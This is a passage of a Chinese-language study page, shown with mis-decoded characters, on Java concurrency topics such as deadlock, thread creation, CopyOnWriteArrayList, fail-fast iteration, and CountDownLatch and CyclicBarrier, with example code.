<h3 id="çº¿ç¨‹æ­»é”çš„å››ä¸ªå¿…è¦æ¡ä»¶"><a href="#çº¿ç¨‹æ­»é”çš„å››ä¸ªå¿…è¦æ¡ä»¶" class="headerlink" title="çº¿ç¨‹æ­»é”çš„å››ä¸ªå¿…è¦æ¡ä»¶?"></a>çº¿ç¨‹æ­»é”çš„å››ä¸ªå¿…è¦æ¡ä»¶?</h3><p>äº’æ–¥,è¯·æ±‚å’Œä¿æŒ,ä¸å¯å‰¥å¤º,å¾ªç¯ç­‰å¾…;</p>
<h3 id="æ­»é”å¤„ç†æ–¹æ¡ˆ"><a href="#æ­»é”å¤„ç†æ–¹æ¡ˆ" class="headerlink" title="æ­»é”å¤„ç†æ–¹æ¡ˆ?"></a>æ­»é”å¤„ç†æ–¹æ¡ˆ?</h3><p>ç ´å4ä¸ªå¿…è¦æ¡ä»¶;é“¶è¡Œå®¶ç®—æ³•;æ­»é”çš„æ£€æµ‹ä¸æ¢å¤;</p>
<h3 id="sleep-å’Œwait"><a href="#sleep-å’Œwait" class="headerlink" title="sleep()å’Œwait()"></a>sleep()å’Œwait()</h3><p>sleep()ä¸é‡Šæ”¾é”,wait()é‡Šæ”¾é”;wait()ç”¨äºçº¿ç¨‹é—´äº¤äº’&#x2F;é€šä¿¡,sleepç”¨äºæš‚åœæ‰§è¡Œ;waitéœ€è¦åˆ«çš„å¯¹è±¡è°ƒç”¨åŒä¸€å¯¹è±¡ä¸Šçš„notify()å’ŒnotifyAll()æˆ–è€…ä½¿ç”¨wait(long timeout)è‡ªåŠ¨è‹é†’;</p>
<h3 id="Start-å’ŒRun"><a href="#Start-å’ŒRun" class="headerlink" title="Start()å’ŒRun()"></a>Start()å’ŒRun()</h3><p>new ä¸€ä¸ª Threadï¼Œçº¿ç¨‹è¿›å…¥äº†æ–°å»ºçŠ¶æ€ã€‚è°ƒç”¨ start()æ–¹æ³•ï¼Œä¼šå¯åŠ¨ä¸€ä¸ªçº¿ç¨‹å¹¶ä½¿çº¿ç¨‹è¿›å…¥äº†å°±ç»ªçŠ¶æ€ï¼Œå½“åˆ†é…åˆ°æ—¶é—´ç‰‡åå°±å¯ä»¥å¼€å§‹è¿è¡Œäº†ã€‚ start() ä¼šæ‰§è¡Œçº¿ç¨‹çš„ç›¸åº”å‡†å¤‡å·¥ä½œï¼Œç„¶åè‡ªåŠ¨æ‰§è¡Œ run() æ–¹æ³•çš„å†…å®¹ï¼Œè¿™æ˜¯çœŸæ­£çš„å¤šçº¿ç¨‹å·¥ä½œã€‚ ä½†æ˜¯ï¼Œç›´æ¥æ‰§è¡Œ run() æ–¹æ³•ï¼Œä¼šæŠŠ run() æ–¹æ³•å½“æˆä¸€ä¸ª main çº¿ç¨‹ä¸‹çš„æ™®é€šæ–¹æ³•å»æ‰§è¡Œï¼Œå¹¶ä¸ä¼šåœ¨æŸä¸ªçº¿ç¨‹ä¸­æ‰§è¡Œå®ƒï¼Œæ‰€ä»¥è¿™å¹¶ä¸æ˜¯å¤šçº¿ç¨‹å·¥ä½œã€‚</p>
<h4 id="åˆ›å»ºçº¿ç¨‹çš„3ç§æ–¹å¼"><a href="#åˆ›å»ºçº¿ç¨‹çš„3ç§æ–¹å¼" class="headerlink" title="åˆ›å»ºçº¿ç¨‹çš„3ç§æ–¹å¼"></a>åˆ›å»ºçº¿ç¨‹çš„3ç§æ–¹å¼</h4><ul>
<li><p>ç»§æ‰¿threadç±»,é‡å†™runæ–¹æ³•,è°ƒç”¨start()å¼€å¯çº¿ç¨‹,ä¸å»ºè®®ä½¿ç”¨,é¿å…oop(object-oriented programming)å•ç»§æ‰¿å±€é™æ€§; Threadç±»ä¹Ÿå®ç°äº†Runableæ¥å£ï¼ŒThreadç±»é‡Œé¢çš„startæ–¹æ³•è°ƒç”¨nativeçš„startæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯æœ‰æ“ä½œç³»ç»Ÿæ¥åˆ›å»ºçº¿ç¨‹ã€‚</p>
</li>
<li><p>å®ç°runnableæ¥å£,é‡å†™runæ–¹æ³•, new Thread(p).start() (æ¨è);é¿å…å•ç»§æ‰¿å±€é™æ€§,çµæ´»æ–¹ä¾¿,æ–¹ä¾¿åŒä¸€ä¸ªå¯¹è±¡è¢«å¤šä¸ªçº¿ç¨‹ä½¿ç”¨ï¼Œï¼ˆç”¨åˆ°äº†ä»£ç†æ¨¡å¼ï¼‰,è¿™é‡Œå¯ä»¥ä½¿ç”¨åŒ¿åå†…éƒ¨ç±»</p>
</li>
<li><p>å®ç°Callableæ¥å£</p>
</li>
</ul>
<p>ï¼ˆ1ï¼‰åˆ›å»ºCallableæ¥å£çš„å®ç°ç±»ï¼Œå¹¶å®ç°call()æ–¹æ³•ï¼Œè¯¥call()æ–¹æ³•å°†ä½œä¸ºçº¿ç¨‹æ‰§è¡Œä½“ï¼Œå¹¶ä¸”æœ‰è¿”å›å€¼ã€‚</p>
<p>ï¼ˆ2ï¼‰åˆ›å»ºCallableå®ç°ç±»çš„å®ä¾‹ï¼Œä½¿ç”¨FutureTask(å®ç°RunnableFutrueæ¥å£ï¼Œ è¿™ä¸ªæ¥å£æœ‰ç»§æ‰¿Runnableæ¥å£)ç±»æ¥åŒ…è£…Callableå¯¹è±¡ï¼Œè¯¥FutureTaskå¯¹è±¡å°è£…äº†è¯¥Callableå¯¹è±¡çš„call()æ–¹æ³•çš„è¿”å›å€¼ã€‚</p>
<p>ï¼ˆ3ï¼‰ä½¿ç”¨FutureTaskå¯¹è±¡ä½œä¸ºThreadå¯¹è±¡çš„targetåˆ›å»ºå¹¶å¯åŠ¨æ–°çº¿ç¨‹ã€‚</p>
<p>ï¼ˆ4ï¼‰è°ƒç”¨FutureTaskå¯¹è±¡çš„get()æ–¹æ³•æ¥è·å¾—å­çº¿ç¨‹æ‰§è¡Œç»“æŸåçš„è¿”å›å€¼</p>
<h3 id="åœæ­¢çº¿ç¨‹"><a href="#åœæ­¢çº¿ç¨‹" class="headerlink" title="åœæ­¢çº¿ç¨‹"></a>åœæ­¢çº¿ç¨‹</h3><p>ä¸æ¨èä½¿ç”¨jdkæä¾›çš„stop()å’Œdestroy()æ–¹æ³•; æ¨èçº¿ç¨‹è‡ªå·±åœä¸‹æ¥, ä½¿ç”¨ä¸€ä¸ªæ ‡å¿—ä½æ¥ç»ˆæ­¢; </p>
<p>Yield()ç¤¼è®©ä½†ä¸ä¸€å®šæˆåŠŸ,è®©å‡ºcpuç„¶åé‡æ–°ç«äº‰; join (åº•å±‚æ˜¯waitæ–¹æ³•, æ¯ä¸ªçº¿ç¨‹é€€å‡ºçš„æ—¶å€™ä¼šè°ƒç”¨notofyAll()(ä¼˜å…ˆçº§é«˜çš„ä¼˜å…ˆè¢«è°ƒåº¦)æ–¹æ³•ï¼Œé€šçŸ¥æ‰€æœ‰ç­‰å¾…åœ¨è¯¥çº¿ç¨‹å¯¹è±¡ä¸Šçš„çº¿ç¨‹)ä¼šè®©è‡ªå·±åœä¸‹æ¥,ç­‰è¢«è‡ªå·±æ’é˜Ÿçš„é‚£ä¸ªçº¿ç¨‹æ‰§è¡Œå®Œæ‰æ‰§è¡Œè‡ªå·±;</p>
<h3 id="CopyOnWriteArrayListï¼ˆCOWï¼‰"><a href="#CopyOnWriteArrayListï¼ˆCOWï¼‰" class="headerlink" title="CopyOnWriteArrayListï¼ˆCOWï¼‰"></a>CopyOnWriteArrayListï¼ˆCOWï¼‰</h3><p>concurrentModificationException å¹¶å‘ä¿®æ”¹å¼‚å¸¸</p>
<p>vectoræ˜¯å®‰å…¨çš„ï¼› Collections.synchronizedList(); ä½¿ç”¨JUCä¸‹çš„CopyOnWriteArrayListï¼›</p>
<p>cow ï¼š åœ¨å†™å…¥æ—¶å€™é¿å…è¦†ç›–ï¼Œé€ æˆæ•°æ®é—®é¢˜ï¼›cowå®ç°åœ¨jdk8ä¹‹åçš„ç‰ˆæœ¬æ”¹æˆäº†synchronizedï¼Œæ¯”lockæ›´é«˜æ•ˆï¼›</p>
<p>å¤šçº¿ç¨‹åŒæ—¶å†™ä¹Ÿä¸ä¼šå‡ºé—®é¢˜, ä½¿ç”¨volatileä¿®é¥°, ä½¿ç”¨äº†reentrantlock</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// jdk 8</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> Object[] array;</span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="built_in">this</span>.lock;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object[] elements = getArray();</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> elements.length;</span><br><span class="line">            <span class="comment">// å¤åˆ¶ä¸€ä»½</span></span><br><span class="line">            Object[] newElements = Arrays.copyOf(elements, len + <span class="number">1</span>);</span><br><span class="line">            newElements[len] = e;</span><br><span class="line">            setArray(newElements);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="Fail-fast-å¿«é€Ÿå¤±è´¥-å’Œ-fail-safe-å®‰å…¨å¤±è´¥"><a href="#Fail-fast-å¿«é€Ÿå¤±è´¥-å’Œ-fail-safe-å®‰å…¨å¤±è´¥" class="headerlink" title="Fail-fast(å¿«é€Ÿå¤±è´¥) å’Œ fail-safe(å®‰å…¨å¤±è´¥)"></a>Fail-fast(å¿«é€Ÿå¤±è´¥) å’Œ fail-safe(å®‰å…¨å¤±è´¥)</h3><p>fail-safeå…è®¸åœ¨éå†çš„è¿‡ç¨‹ä¸­å¯¹å®¹å™¨ä¸­çš„æ•°æ®è¿›è¡Œä¿®æ”¹ï¼Œè€Œfail-faståˆ™ä¸å…è®¸ã€‚</p>
<p> <strong>fail-fast ( å¿«é€Ÿå¤±è´¥ )</strong></p>
<p>fail-fast:ç›´æ¥åœ¨å®¹å™¨ä¸Šè¿›è¡Œéå†ï¼Œåœ¨éå†è¿‡ç¨‹ä¸­ï¼Œä¸€æ—¦å‘ç°å®¹å™¨ä¸­çš„æ•°æ®è¢«ä¿®æ”¹äº†ï¼Œä¼šç«‹åˆ»æŠ›å‡ºConcurrentModificationExceptionå¼‚å¸¸å¯¼è‡´éå†å¤±è´¥ã€‚java.utilåŒ…ä¸‹çš„é›†åˆç±»éƒ½æ˜¯å¿«é€Ÿå¤±è´¥æœºåˆ¶çš„, å¸¸è§çš„çš„ä½¿ç”¨fail-fastæ–¹å¼éå†çš„å®¹å™¨æœ‰HashMapå’ŒArrayListç­‰ã€‚</p>
<p>åœ¨ä½¿ç”¨è¿­ä»£å™¨éå†ä¸€ä¸ªé›†åˆå¯¹è±¡æ—¶,æ¯”å¦‚å¢å¼ºfor,å¦‚æœéå†è¿‡ç¨‹ä¸­å¯¹é›†åˆå¯¹è±¡çš„å†…å®¹è¿›è¡Œäº†ä¿®æ”¹(å¢åˆ æ”¹),ä¼šæŠ›å‡ºConcurrentModificationException å¼‚å¸¸.</p>
<p>fail-fastçš„å‡ºç°åœºæ™¯<br>åœ¨æˆ‘ä»¬å¸¸è§çš„javaé›†åˆä¸­å°±å¯èƒ½å‡ºç°fail-fastæœºåˆ¶,æ¯”å¦‚ArrayListï¼ŒHashMapã€‚åœ¨å¤šçº¿ç¨‹å’Œå•çº¿ç¨‹ç¯å¢ƒä¸‹éƒ½æœ‰å¯èƒ½å‡ºç°å¿«é€Ÿå¤±è´¥ã€‚</p>
<p>é¿å…fail-fastçš„æ–¹æ³•ï¼š</p>
<p>æ–¹æ³•1</p>
<p>åœ¨å•çº¿ç¨‹çš„éå†è¿‡ç¨‹ä¸­ï¼Œå¦‚æœè¦è¿›è¡Œremoveæ“ä½œï¼Œå¯ä»¥è°ƒç”¨è¿­ä»£å™¨çš„removeæ–¹æ³•è€Œä¸æ˜¯é›†åˆç±»çš„removeæ–¹æ³•</p>
<p>æ–¹æ³•2</p>
<p>ä½¿ç”¨fail-safeæœºåˆ¶ï¼Œä½¿ç”¨javaå¹¶å‘åŒ…(java.util.concurrent)ä¸­çš„CopyOnWriterArrayListç±»æ¥ä»£æ›¿ArrayListï¼Œä½¿ç”¨ ConcurrentHashMapæ¥ä»£æ›¿hashMapã€‚</p>
<p><strong>fail-safe ( å®‰å…¨å¤±è´¥ )</strong><br>fail-safe:è¿™ç§éå†åŸºäºå®¹å™¨çš„ä¸€ä¸ªå…‹éš†ã€‚å› æ­¤ï¼Œå¯¹å®¹å™¨å†…å®¹çš„ä¿®æ”¹ä¸å½±å“éå†ã€‚java.util.concurrentåŒ…ä¸‹çš„å®¹å™¨éƒ½æ˜¯å®‰å…¨å¤±è´¥çš„,å¯ä»¥åœ¨å¤šçº¿ç¨‹ä¸‹å¹¶å‘ä½¿ç”¨,å¹¶å‘ä¿®æ”¹ã€‚å¸¸è§çš„çš„ä½¿ç”¨fail-safeæ–¹å¼éå†çš„å®¹å™¨æœ‰ConcerrentHashMapå’ŒCopyOnWriteArrayListç­‰ã€‚</p>
<p>åŸç†ï¼š</p>
<p>é‡‡ç”¨å®‰å…¨å¤±è´¥æœºåˆ¶çš„é›†åˆå®¹å™¨ï¼Œåœ¨éå†æ—¶ä¸æ˜¯ç›´æ¥åœ¨é›†åˆå†…å®¹ä¸Šè®¿é—®çš„ï¼Œè€Œæ˜¯å…ˆå¤åˆ¶åŸæœ‰é›†åˆå†…å®¹ï¼Œåœ¨æ‹·è´çš„é›†åˆä¸Šè¿›è¡Œéå†ã€‚ç”±äºè¿­ä»£æ—¶æ˜¯å¯¹åŸé›†åˆçš„æ‹·è´è¿›è¡Œéå†ï¼Œæ‰€ä»¥åœ¨éå†è¿‡ç¨‹ä¸­å¯¹åŸé›†åˆæ‰€ä½œçš„ä¿®æ”¹å¹¶ä¸èƒ½è¢«è¿­ä»£å™¨æ£€æµ‹åˆ°ï¼Œæ‰€ä»¥ä¸ä¼šè§¦å‘Concurrent Modification Exceptionã€‚</p>
<p>ç¼ºç‚¹ï¼šåŸºäºæ‹·è´å†…å®¹çš„ä¼˜ç‚¹æ˜¯é¿å…äº†Concurrent Modification Exceptionï¼Œä½†åŒæ ·åœ°ï¼Œè¿­ä»£å™¨å¹¶ä¸èƒ½è®¿é—®åˆ°ä¿®æ”¹åçš„å†…å®¹ï¼Œå³ï¼šè¿­ä»£å™¨éå†çš„æ˜¯å¼€å§‹éå†é‚£ä¸€åˆ»æ‹¿åˆ°çš„é›†åˆæ‹·è´ï¼Œåœ¨éå†æœŸé—´åŸé›†åˆå‘ç”Ÿçš„ä¿®æ”¹è¿­ä»£å™¨æ˜¯ä¸çŸ¥é“çš„ã€‚</p>
<h3 id="concurrentModificationException-å¹¶å‘ä¿®æ”¹å¼‚å¸¸"><a href="#concurrentModificationException-å¹¶å‘ä¿®æ”¹å¼‚å¸¸" class="headerlink" title="concurrentModificationException å¹¶å‘ä¿®æ”¹å¼‚å¸¸"></a>concurrentModificationException å¹¶å‘ä¿®æ”¹å¼‚å¸¸</h3><p>åœ¨å¹¶å‘æƒ…å†µä¸‹ï¼Œå¤šä¸ªçº¿ç¨‹åŒæ—¶è¯»å†™å¯èƒ½ä¼šæŠ¥è¿™ä¸ªå¼‚å¸¸</p>
<p>vectoræ˜¯å®‰å…¨çš„ï¼› Collections.synchronizedList(); ä½¿ç”¨JUCä¸‹çš„CopyOnWriteArrayListï¼›</p>
<p>cow ï¼š åœ¨å†™å…¥æ—¶å€™é¿å…è¦†ç›–ï¼Œé€ æˆæ•°æ®é—®é¢˜ï¼›cowåé¢æ”¹æˆäº†synchronizedï¼Œæ¯”lockæ›´é«˜æ•ˆï¼›</p>
<h3 id="ArrayIndexOutOfBoundsException"><a href="#ArrayIndexOutOfBoundsException" class="headerlink" title="ArrayIndexOutOfBoundsException"></a>ArrayIndexOutOfBoundsException</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> syn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-25 9:37 ä¸Šåˆ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestArrayList</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        ArrayList&lt;String&gt; strings = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">101</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i1</span> <span class="operator">=</span> <span class="number">0</span>; i1 &lt; <span class="number">20</span>; i1++) &#123;</span><br><span class="line">                    strings.add(UUID.randomUUID().toString().substring(<span class="number">0</span>,<span class="number">5</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        System.out.println(strings.size());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="CopyOnWriteSet"><a href="#CopyOnWriteSet" class="headerlink" title="CopyOnWriteSet"></a>CopyOnWriteSet</h3><p>collections.synchronizedSet(); </p>
<h3 id="ä¸¤ä¸ªçº¿ç¨‹äº¤æ›¿æ‰“å°1-100"><a href="#ä¸¤ä¸ªçº¿ç¨‹äº¤æ›¿æ‰“å°1-100" class="headerlink" title="ä¸¤ä¸ªçº¿ç¨‹äº¤æ›¿æ‰“å°1-100"></a>ä¸¤ä¸ªçº¿ç¨‹äº¤æ›¿æ‰“å°1-100</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * synchronizedå®ç°</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doSynchronized1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Number</span> <span class="variable">number</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Number</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            number.odd();</span><br><span class="line">        &#125;, <span class="string">&quot;odd&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            number.even();</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Number</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">TOTAL</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">even</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (i &lt;= TOTAL) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;i=&quot;</span> + i++);</span><br><span class="line">                <span class="built_in">this</span>.notify();</span><br><span class="line">                System.out.println(<span class="string">&quot;å¶æ•°æ‰“å°å®Œæ¯•ï¼Œé‡Šæ”¾é”&quot;</span>);</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;å¶æ•°é”ç­‰å¾…&quot;</span>);</span><br><span class="line">                    <span class="built_in">this</span>.wait();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">odd</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (i &lt;= TOTAL) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;i=&quot;</span> + i++);</span><br><span class="line">                <span class="built_in">this</span>.notify();</span><br><span class="line">                System.out.println(<span class="string">&quot;å¥‡æ•°æ‰“å°å®Œæ¯•ï¼Œé‡Šæ”¾é”&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;å¥‡æ•°é”ç­‰å¾…&quot;</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">this</span>.wait();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * lockå®ç°</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doLock</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Number2</span> <span class="variable">number2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Number2</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            number2.odd();</span><br><span class="line">        &#125;, <span class="string">&quot;odd&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            number2.even();</span><br><span class="line">        &#125;, <span class="string">&quot;even&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Number2</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">TOTAL</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">    <span class="type">Lock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line">    <span class="type">Condition</span> <span class="variable">condition</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">even</span><span class="params">()</span> &#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &lt;= TOTAL) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;i=&quot;</span> + i++);</span><br><span class="line">                    condition.signal();</span><br><span class="line">                    System.out.println(<span class="string">&quot;å¶æ•°æ‰“å°å®Œæ¯•ï¼Œé‡Šæ”¾é”&quot;</span>);</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        System.out.println(<span class="string">&quot;å¶æ•°é”ç­‰å¾…&quot;</span>);</span><br><span class="line">                        condition.await();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">odd</span><span class="params">()</span> &#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &lt;= TOTAL) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;i=&quot;</span> + i++);</span><br><span class="line">                    condition.signal();</span><br><span class="line">                    System.out.println(<span class="string">&quot;å¥‡æ•°æ‰“å°å®Œæ¯•ï¼Œé‡Šæ”¾é”&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        System.out.println(<span class="string">&quot;å¥‡æ•°é”ç­‰å¾…&quot;</span>);</span><br><span class="line">                        condition.await();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CountDownLatch"><a href="#CountDownLatch" class="headerlink" title="CountDownLatch"></a>CountDownLatch</h3><p>å…è®¸ä¸€ä¸ªæˆ–å¤šä¸ªçº¿ç¨‹ç­‰å¾…ç›´åˆ°åœ¨å…¶ä»–çº¿ç¨‹ä¸­æ‰§è¡Œçš„ä¸€ç»„æ“ä½œå®Œæˆçš„åŒæ­¥è¾…åŠ©;CASæ€æƒ³;å‡æ³•è®¡æ•°å™¨;å¯ä»¥ä¸€ä¸ªçº¿ç¨‹é‡Œcountdownå¾ˆå¤šæ¬¡ï¼Œä¸ä¸€å®šè¦åœ¨å¤šä¸ªçº¿ç¨‹é‡Œï¼›</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">countDownLatch.countDown(); <span class="comment">// æ•°é‡-1</span></span><br><span class="line">        countDownLatch.await(); <span class="comment">// ç­‰å¾…è®¡æ•°å™¨å½’é›¶,ç„¶åå‘ä¸‹æ‰§è¡Œ</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="CyclicBarrier"><a href="#CyclicBarrier" class="headerlink" title="CyclicBarrier"></a>CyclicBarrier</h3><p>åŠ æ³•è®¡æ•°å™¨,åº•å±‚ä½¿ç”¨reentrantlock, å¦‚æœè®¡æ•°å™¨åˆ°è¾¾äº†è®¾ç½®å€¼,åˆ™ä¼šæ–°å»ºä¸€ä¸ªçº¿ç¨‹å»æ‰§è¡Œ;</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> add;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.BrokenBarrierException;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.CyclicBarrier;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-26 4:10 ä¸‹åˆ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CyclicBarrierDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">CyclicBarrier</span> <span class="variable">success</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CyclicBarrier</span>(<span class="number">8</span>, () -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;æ”¶é›†&quot;</span>+temp+<span class="string">&quot;ä¸ªé¾™ç &quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">     